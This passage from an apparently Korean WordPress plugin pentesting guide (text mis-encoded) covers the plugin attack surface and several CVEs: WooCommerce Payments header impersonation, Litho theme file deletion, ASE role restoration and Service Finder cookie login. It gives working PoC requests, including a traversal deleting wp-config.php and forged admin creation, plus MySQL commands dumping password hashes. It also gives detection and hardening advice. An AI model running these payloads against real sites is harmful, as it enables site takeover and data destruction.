ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ ë³€ê²½:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress í”ŒëŸ¬ê·¸ì¸ Pentest

### Attack Surface

Wordpress í”ŒëŸ¬ê·¸ì¸ì´ ì–´ë–»ê²Œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ëŠ”ì§€ ì•„ëŠ” ê²ƒì€ í•´ë‹¹ ê¸°ëŠ¥ì˜ ì·¨ì•½ì ì„ ì°¾ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤. ë‹¤ìŒ í•­ëª©ë“¤ì—ì„œ í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ì–´ë–»ê²Œ ë…¸ì¶œí•  ìˆ˜ ìˆëŠ”ì§€ì™€ ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ ì‚¬ë¡€ë“¤ì„ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **`wp_ajax`**

í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” AJAX í•¸ë“¤ëŸ¬ë¥¼ í†µí•´ì„œì…ë‹ˆë‹¤. ì´ëŸ¬í•œ í•¸ë“¤ëŸ¬ë“¤ì€ ë¡œì§, authorization, ë˜ëŠ” authentication ë²„ê·¸ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²Œë‹¤ê°€ ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì€ ì¸ì¦ê³¼ ê¶Œí•œ ë¶€ì—¬ë¥¼ ëª¨ë‘ Wordpress nonceì˜ ì¡´ì¬ì— ê¸°ë°˜í•˜ëŠ” ê²½ìš°ê°€ ê½¤ ìì£¼ ìˆìœ¼ë©°, ì´ nonceëŠ” **Wordpress ì¸ìŠ¤í„´ìŠ¤ì— ì¸ì¦ëœ ì–´ë–¤ ì‚¬ìš©ìë¼ë„ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤**(ì—­í• ê³¼ ë¬´ê´€í•˜ê²Œ).

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`ì˜ ì‚¬ìš©ì€ í•´ë‹¹ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ëª¨ë“  ì‚¬ìš©ì(ì‹¬ì§€ì–´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì)ë„ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë§Œë“­ë‹ˆë‹¤.**

> [!CAUTION]
> ê²Œë‹¤ê°€, ë§Œì•½ í•¨ìˆ˜ê°€ ì‚¬ìš©ì ê¶Œí•œì„ `wp_verify_nonce` í•¨ìˆ˜ë¡œë§Œ í™•ì¸í•œë‹¤ë©´, ì´ í•¨ìˆ˜ëŠ” ë‹¨ì§€ ì‚¬ìš©ìê°€ ë¡œê·¸ì¸í–ˆëŠ”ì§€ ì—¬ë¶€ë§Œ í™•ì¸í•  ë¿ ë³´í†µ ì‚¬ìš©ìì˜ ì—­í• (role)ì€ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê¶Œí•œì´ ë‚®ì€ ì‚¬ìš©ìê°€ ë†’ì€ ê¶Œí•œì´ í•„ìš”í•œ ë™ì‘ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **REST API**

ë˜í•œ wordpressì—ì„œ `register_rest_route` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ rest APë¥¼ ë“±ë¡í•˜ì—¬ í•¨ìˆ˜ë¥¼ ë…¸ì¶œì‹œí‚¤ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback`ì€ íŠ¹ì • ì‚¬ìš©ìê°€ API ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ì½œë°± í•¨ìˆ˜ì…ë‹ˆë‹¤.

**ë‚´ì¥ `__return_true` í•¨ìˆ˜ê°€ ì‚¬ìš©ë˜ë©´ ì‚¬ìš©ì ê¶Œí•œ ê²€ì‚¬ë¥¼ ë‹¨ìˆœíˆ ê±´ë„ˆëœë‹ˆë‹¤.**

- **php íŒŒì¼ì— ëŒ€í•œ ì§ì ‘ ì ‘ê·¼**

ë¬¼ë¡ , WordpressëŠ” PHPë¥¼ ì‚¬ìš©í•˜ë©° í”ŒëŸ¬ê·¸ì¸ ë‚´ë¶€ì˜ íŒŒì¼ë“¤ì€ ì›¹ì—ì„œ ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í”ŒëŸ¬ê·¸ì¸ì´ íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ì·¨ì•½í•œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ê³  ìˆë‹¤ë©´, ì–´ë–¤ ì‚¬ìš©ìë¼ë„ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ ë‚´ë¶€ í†µí•©ì´ë‚˜ reverse proxiesë¥¼ ìœ„í•´ â€œtrusted headerâ€ ë‹¨ì¶•ì„ êµ¬í˜„í•œ ë’¤, í•´ë‹¹ í—¤ë”ë¡œ REST ìš”ì²­ì˜ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ë§Œì•½ ê·¸ í—¤ë”ê°€ upstream componentì— ì˜í•´ ìš”ì²­ì— ëŒ€í•´ ì•”í˜¸í•™ì ìœ¼ë¡œ ë°”ì¸ë”©ë˜ì–´ ìˆì§€ ì•Šë‹¤ë©´, ê³µê²©ìëŠ” ì´ë¥¼ spoofí•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œì´ í•„ìš”í•œ REST routesë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì˜í–¥: core users REST routeë¥¼ í†µí•´ ìƒˆë¡œìš´ administratorë¥¼ ìƒì„±í•˜ì—¬ unauthenticated privilege escalationìœ¼ë¡œ admin ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (user ID 1ì„ ê°•ì œë¡œ ì„¤ì • â€” ì¼ë°˜ì ìœ¼ë¡œ ì²« ë²ˆì§¸ administrator ê³„ì •).
- Exploited route: `POST /wp-json/wp/v2/users` ì—ì„œ elevated role ë°°ì—´ì„ ì‚¬ìš©.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- ì´ í”ŒëŸ¬ê·¸ì¸ì€ í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” í—¤ë”ë¥¼ ì¸ì¦ ìƒíƒœì— ë§¤í•‘í•˜ê³  capability checksë¥¼ ìƒëµí•œë‹¤.
- WordPress coreëŠ” ì´ ë¼ìš°íŠ¸ì— `create_users` capabilityë¥¼ ê¸°ëŒ€í•œë‹¤; í”ŒëŸ¬ê·¸ì¸ í•´í‚¹ì€ í—¤ë”ì—ì„œ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì§ì ‘ ì„¤ì •í•˜ì—¬ ì´ë¥¼ ìš°íšŒí•œë‹¤.

Expected success indicators

- HTTP 201 with a JSON body describing the created user.
- A new admin user visible in `wp-admin/users.php`.

Detection checklist

- `getallheaders()`, `$_SERVER['HTTP_...']` ë˜ëŠ” vendor SDKë“¤ì´ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ ì»¤ìŠ¤í…€ í—¤ë”ë¥¼ ì½ëŠ”ì§€ grep í•˜ë¼(ì˜ˆ: `wp_set_current_user()`, `wp_set_auth_cookie()`).
- ìš”ì²­ í—¤ë”ì— ì˜ì¡´í•˜ê³  ê°•ë ¥í•œ `permission_callback` ê²€ì‚¬ê°€ ì—†ëŠ” ê¶Œí•œ ìˆëŠ” ì½œë°±ì— ëŒ€í•œ REST ë“±ë¡ì„ ê²€í† í•˜ë¼.
- REST í•¸ë“¤ëŸ¬ ë‚´ì—ì„œ header ê°’ë§Œìœ¼ë¡œ ê²Œì´íŠ¸ëœ ìƒíƒœë¡œ ì½”ì–´ ì‚¬ìš©ì ê´€ë¦¬ í•¨ìˆ˜(`wp_insert_user`, `wp_create_user`)ê°€ ì‚¬ìš©ë˜ëŠ”ì§€ ì°¾ìœ¼ë¼.

Hardening

- í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” í—¤ë”ì—ì„œ ì¸ì¦ì´ë‚˜ ê¶Œí•œì„ ìœ ì¶”í•˜ì§€ ë§ˆë¼.
- ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œê°€ ë°˜ë“œì‹œ identityë¥¼ ì£¼ì…í•´ì•¼ í•œë‹¤ë©´ í”„ë¡ì‹œì—ì„œ ì‹ ë¢°ë¥¼ ì¢…ë£Œí•˜ê³  ìˆ˜ì‹ ëœ ë³µì‚¬ë³¸ì„ ì œê±°í•˜ë¼(ì˜ˆ: ì—ì§€ì—ì„œ `unset X-Wcpay-Platform-Checkout-User`), ê·¸ í›„ ì„œëª…ëœ í† í°ì„ ì „ë‹¬í•˜ê³  ì„œë²„ ì¸¡ì—ì„œ ê²€ì¦í•˜ë¼.
- ê¶Œí•œì´ í•„ìš”í•œ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” REST ê²½ë¡œì—ëŠ” `current_user_can()` ê²€ì‚¬ì™€ ì—„ê²©í•œ `permission_callback`ì„ ìš”êµ¬í•˜ë¼(ì ˆëŒ€ `__return_true`ë¥¼ ì‚¬ìš©í•˜ì§€ ë§ˆë¼).
- í—¤ë” â€œimpersonationâ€ë³´ë‹¤ í¼ìŠ¤íŠ¸íŒŒí‹° ì¸ì¦(cookies, application passwords, OAuth)ì„ ì„ í˜¸í•˜ë¼.

References: see the links at the end of this page for a public case and broader analysis.

### wp_ajax_noprivë¥¼ í†µí•œ ì¸ì¦ë˜ì§€ ì•Šì€ ì„ì˜ íŒŒì¼ ì‚­ì œ (Litho Theme <= 3.0)

WordPress í…Œë§ˆì™€ í”ŒëŸ¬ê·¸ì¸ì€ ì¢…ì¢… `wp_ajax_` ë° `wp_ajax_nopriv_` í›…ì„ í†µí•´ AJAX í•¸ë“¤ëŸ¬ë¥¼ ë…¸ì¶œí•œë‹¤. **_nopriv_** ë³€í˜•ì´ ì‚¬ìš©ë  ê²½ìš° **ì½œë°±ì´ ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìì—ê²Œ ì ‘ê·¼ ê°€ëŠ¥í•´ì§€ë¯€ë¡œ**, ë¯¼ê°í•œ ë™ì‘ì€ ì¶”ê°€ë¡œ ë‹¤ìŒì„ êµ¬í˜„í•´ì•¼ í•œë‹¤:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
ì´ ìŠ¤ë‹ˆí«ìœ¼ë¡œ ì¸í•´ ë°œìƒí•œ ë¬¸ì œ:

* **Unauthenticated access** â€“ the `wp_ajax_nopriv_` í›…ì´ ë“±ë¡ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
* **No nonce / capability check** â€“ ì–´ë–¤ ë°©ë¬¸ìë“  ì—”ë“œí¬ì¸íŠ¸ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **No path sanitisation** â€“ ì‚¬ìš©ì ì œì–´ `fontfamily` ë¬¸ìì—´ì´ í•„í„°ë§ ì—†ì´ íŒŒì¼ì‹œìŠ¤í…œ ê²½ë¡œì— ì´ì–´ë¶™ì—¬ì ¸ ê³ ì „ì ì¸ `../../` ê²½ë¡œ íƒˆì·¨ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.

#### ì•…ìš©

ê³µê²©ìëŠ” ë‹¨ì¼ HTTP POST ìš”ì²­ì„ ë³´ë‚´ì–´ **uploads ê¸°ë³¸ ë””ë ‰í„°ë¦¬ ì•„ë˜** (ì¼ë°˜ì ìœ¼ë¡œ `<wp-root>/wp-content/uploads/`)ì˜ ì„ì˜ì˜ íŒŒì¼ì´ë‚˜ ë””ë ‰í„°ë¦¬ë¥¼ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
`wp-config.php`ê°€ *uploads* ë°–ì— ìœ„ì¹˜í•˜ê¸° ë•Œë¬¸ì—, ê¸°ë³¸ ì„¤ì¹˜ì—ì„œëŠ” `../` ë„¤ ë²ˆì´ë©´ ì¶©ë¶„í•©ë‹ˆë‹¤. `wp-config.php`ë¥¼ ì‚­ì œí•˜ë©´ ë‹¤ìŒ ë°©ë¬¸ ì‹œ WordPressê°€ *installation wizard*ë¡œ ë“¤ì–´ê°€ë©° ì „ì²´ ì‚¬ì´íŠ¸ íƒˆì·¨ê°€ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤(ê³µê²©ìëŠ” ìƒˆ DB êµ¬ì„±ë§Œ ì œê³µí•˜ê³  ê´€ë¦¬ì ì‚¬ìš©ì ê³„ì •ì„ ìƒì„±í•˜ë©´ ë©ë‹ˆë‹¤).

ë‹¤ë¥¸ ì˜í–¥ë ¥ ìˆëŠ” ëŒ€ìƒìœ¼ë¡œëŠ” í”ŒëŸ¬ê·¸ì¸/í…Œë§ˆì˜ `.php` íŒŒì¼ë“¤(ë³´ì•ˆ í”ŒëŸ¬ê·¸ì¸ì„ ë¬´ë ¥í™”í•˜ê¸° ìœ„í•´)ì´ë‚˜ `.htaccess` ê·œì¹™ì´ ìˆìŠµë‹ˆë‹¤.

#### íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

* íŒŒì¼ì‹œìŠ¤í…œ í—¬í¼(`copy()`, `unlink()`, `$wp_filesystem->delete()` ë“±)ë¥¼ í˜¸ì¶œí•˜ëŠ” `add_action( 'wp_ajax_nopriv_...')` ì½œë°±.
* ê²½ë¡œë¡œì˜ ë¹„ê²€ì¦ ì‚¬ìš©ì ì…ë ¥ ê²°í•©( `$_POST`, `$_GET`, `$_REQUEST` ë¥¼ í™•ì¸).
* `check_ajax_referer()` ë° `current_user_can()`/`is_user_logged_in()`ì˜ ë¶€ì¬.

#### ë³´ì•ˆ ê°•í™”
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **í•­ìƒ** ë””ìŠ¤í¬ì— ëŒ€í•œ ëª¨ë“  ì“°ê¸°/ì‚­ì œ ì‘ì—…ì„ ê¶Œí•œì´ í•„ìš”í•œ ê²ƒìœ¼ë¡œ ì²˜ë¦¬í•˜ê³  ë‹¤ìŒì„ ë°˜ë“œì‹œ ì¬í™•ì¸í•˜ì„¸ìš”:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### ì˜¤ë˜ëœ ì—­í•  ë³µì› ë° ê¶Œí•œ ê²€ì¦ ëˆ„ë½ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹ (ASE "View Admin as Role")

ë§ì€ í”ŒëŸ¬ê·¸ì¸ì€ ì›ë˜ ì—­í• ì„ user metaì— ì €ì¥í•´ ë‚˜ì¤‘ì— ë³µì›í•  ìˆ˜ ìˆë„ë¡ "view as role" ë˜ëŠ” ì„ì‹œ ì—­í•  ì „í™˜ ê¸°ëŠ¥ì„ êµ¬í˜„í•©ë‹ˆë‹¤. ë³µì› ê²½ë¡œê°€ ìš”ì²­ íŒŒë¼ë¯¸í„°(ì˜ˆ: `$_REQUEST['reset-for']`)ì™€ í”ŒëŸ¬ê·¸ì¸ì´ ê´€ë¦¬í•˜ëŠ” ëª©ë¡ì—ë§Œ ì˜ì¡´í•˜ê³  ê¶Œí•œ í™•ì¸ì´ë‚˜ ìœ íš¨í•œ nonce ê²€ì¦ì„ ìˆ˜í–‰í•˜ì§€ ì•Šìœ¼ë©´, ì´ëŠ” ìˆ˜ì§ì  ê¶Œí•œ ìƒìŠ¹ì´ ë©ë‹ˆë‹¤.

ì‹¤ì œ ì‚¬ë¡€ëŠ” Admin and Site Enhancements (ASE) plugin (â‰¤ 7.6.2.1)ì—ì„œ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. reset ë¶„ê¸°ëŠ” ë‚´ë¶€ ë°°ì—´ `$options['viewing_admin_as_role_are']`ì— ì‚¬ìš©ìëª…ì´ ì¡´ì¬í•˜ë©´ `reset-for=<username>`ì— ê¸°ë°˜í•´ ì—­í• ì„ ë³µì›í–ˆì§€ë§Œ, í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  user meta `_asenha_view_admin_as_original_roles`ì— ì €ì¥ëœ ì—­í• ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ê¸° ì „ì— `current_user_can()` ê²€ì‚¬ë‚˜ nonce ê²€ì¦ì„ ì „í˜€ ìˆ˜í–‰í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ì·¨ì•½í•œ ì´ìœ 

- ì„œë²„ ì¸¡ ê¶Œí•œ ê²€ì¦ ì—†ì´ `$_REQUEST['reset-for']`ì™€ í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ì„ ì‹ ë¢°í•¨.
- ì‚¬ìš©ìê°€ ì´ì „ì— `_asenha_view_admin_as_original_roles`ì— ë†’ì€ ê¶Œí•œì„ ì €ì¥í•´ë‘ì—ˆë‹¤ê°€ ê¶Œí•œì´ ë‚®ì•„ì§„ ê²½ìš°, ì¬ì„¤ì • ê²½ë¡œë¥¼ í˜¸ì¶œí•´ ì´ë¥¼ ë³µì›í•  ìˆ˜ ìˆìŒ.
- ì¼ë¶€ ë°°í¬ í™˜ê²½ì—ì„œëŠ”, ì–´ë–¤ ì¸ì¦ëœ ì‚¬ìš©ìë¼ë„ ì—¬ì „íˆ `viewing_admin_as_role_are`ì— ë‚¨ì•„ ìˆëŠ” ë‹¤ë¥¸ ì‚¬ìš©ì ì´ë¦„ì— ëŒ€í•´ ì¬ì„¤ì •ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŒ(ê¶Œí•œ ê²€ì¦ ì·¨ì•½).

ê³µê²© ì „ì œ ì¡°ê±´

- ê¸°ëŠ¥ì´ í™œì„±í™”ëœ ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ ë²„ì „.
- ëŒ€ìƒ ê³„ì •ì´ ì´ì „ ì‚¬ìš©ìœ¼ë¡œ ì¸í•´ user metaì— ì €ì¥ëœ ì˜¤ë˜ëœ ê³ ê¶Œí•œ ì—­í• ì„ ë³´ìœ .
- ì¸ì¦ëœ ì„¸ì…˜ë§Œ ìˆìœ¼ë©´ ë¨; ì¬ì„¤ì • íë¦„ì—ì„œ nonce/capabilityê°€ ì—†ìŒ.

ì•…ìš© (ì˜ˆì‹œ)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
ì·¨ì•½í•œ ë¹Œë“œì—ì„œëŠ” í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  ì €ì¥ëœ ì›ë˜ ì—­í• (ì˜ˆ: `administrator`)ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ì—¬ ì‹¤ì§ˆì ìœ¼ë¡œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚µë‹ˆë‹¤.

Detection checklist

- ì‚¬ìš©ì ë©”íƒ€ì— "ì›ë˜ ì—­í• "ì„ ì§€ì†ì ìœ¼ë¡œ ì €ì¥í•˜ëŠ” ì—­í•  ì „í™˜ ê¸°ëŠ¥ì„ ì°¾ì•„ë³´ì„¸ìš” (ì˜ˆ: `_asenha_view_admin_as_original_roles`).
- Identify reset/restore paths that:
- `$_REQUEST` / `$_GET` / `$_POST`ì—ì„œ ì‚¬ìš©ì ì´ë¦„ì„ ì½ëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.
- `add_role()` / `remove_role()`ë¡œ ì—­í• ì„ ìˆ˜ì •í•˜ë©´ì„œ `current_user_can()` ë° `wp_verify_nonce()` / `check_admin_referer()`ë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.
- í–‰ìœ„ìì˜ ê¶Œí•œ ëŒ€ì‹  í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ ë°°ì—´(ì˜ˆ: `viewing_admin_as_role_are`)ì— ê¸°ë°˜í•´ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

Hardening

- ìƒíƒœë¥¼ ë³€ê²½í•˜ëŠ” ëª¨ë“  ë¶„ê¸°ì—ì„œ ê¶Œí•œ ê²€ì‚¬ë¥¼ ì ìš©í•˜ì„¸ìš”(ì˜ˆ: `current_user_can('manage_options')` ë˜ëŠ” ë” ì—„ê²©í•œ ê²€ì‚¬ë¥¼ ì‚¬ìš©).
- ëª¨ë“  ì—­í• /ê¶Œí•œ ë³€ê²½ ì‹œ nonceë¥¼ ìš”êµ¬í•˜ê³  ê²€ì¦í•˜ì„¸ìš”: `check_admin_referer()` / `wp_verify_nonce()`.
- ìš”ì²­ìœ¼ë¡œ ì œê³µëœ ì‚¬ìš©ì ì´ë¦„ì„ ì ˆëŒ€ ì‹ ë¢°í•˜ì§€ ë§ˆì„¸ìš”; ì¸ì¦ëœ í–‰ìœ„ìì™€ ëª…ì‹œì  ì •ì±…ì— ë”°ë¼ ì„œë²„ ì¸¡ì—ì„œ ëŒ€ìƒ ì‚¬ìš©ìë¥¼ ê²°ì •í•˜ì„¸ìš”.
- í”„ë¡œí•„/ì—­í•  ì—…ë°ì´íŠ¸ ì‹œ "ì›ë˜ ì—­í• " ìƒíƒœë¥¼ ë¬´íš¨í™”í•˜ì—¬ ì˜¤ë˜ëœ ê³ ê¶Œí•œ ë³µì›ì´ ë°œìƒí•˜ì§€ ì•Šë„ë¡ í•˜ì„¸ìš”:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- ìµœì†Œí•œì˜ ìƒíƒœë§Œ ì €ì¥í•˜ê³  ì„ì‹œ ì—­í•  ì „í™˜ì„ ìœ„í•´ ì‹œê°„ ì œí•œì´ ìˆê³  capabilityë¡œ ë³´í˜¸ëœ í† í°ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ê³ ë ¤í•˜ì„¸ìš”.

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ user-switching í—¬í¼ë¥¼ ê³µê°œ `init` í›…ì— ì—°ê²°í•˜ê³  í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” cookieì—ì„œ ì‹ë³„ì„ ìœ ë„í•©ë‹ˆë‹¤. `wp_set_auth_cookie()`ë¥¼ ì¸ì¦, capability ë° ìœ íš¨í•œ nonceë¥¼ í™•ì¸í•˜ì§€ ì•Šê³  í˜¸ì¶œí•˜ë©´, ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìê°€ ì„ì˜ì˜ ì‚¬ìš©ì IDë¡œ ê°•ì œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì „í˜•ì ì¸ ì·¨ì•½ íŒ¨í„´(ê°„ì†Œí™”, Service Finder Bookings â‰¤ 6.1ì—ì„œ ë°œì·Œ):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ì™œ ì·¨ì•½í•œê°€

- ê³µê°œëœ `init` í›„í¬ëŠ” í•¸ë“¤ëŸ¬ê°€ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìë„ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë§Œë“ ë‹¤ (`is_user_logged_in()` ê°€ë“œê°€ ì—†ìŒ).
- ì‹ë³„ ì •ë³´ëŠ” í´ë¼ì´ì–¸íŠ¸ì—ì„œ ìˆ˜ì • ê°€ëŠ¥í•œ ì¿ í‚¤(`original_user_id`)ë¡œë¶€í„° íŒŒìƒëœë‹¤.
- `wp_set_auth_cookie($uid)`ë¥¼ ì§ì ‘ í˜¸ì¶œí•˜ë©´ capability/nonce ê²€ì‚¬ ì—†ì´ ìš”ì²­ìë¥¼ í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ì‹œí‚¨ë‹¤.

ì•…ìš©(ì¸ì¦ë˜ì§€ ì•ŠìŒ)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WordPress/plugin CVEsì— ëŒ€í•œ WAF ê³ ë ¤ì‚¬í•­

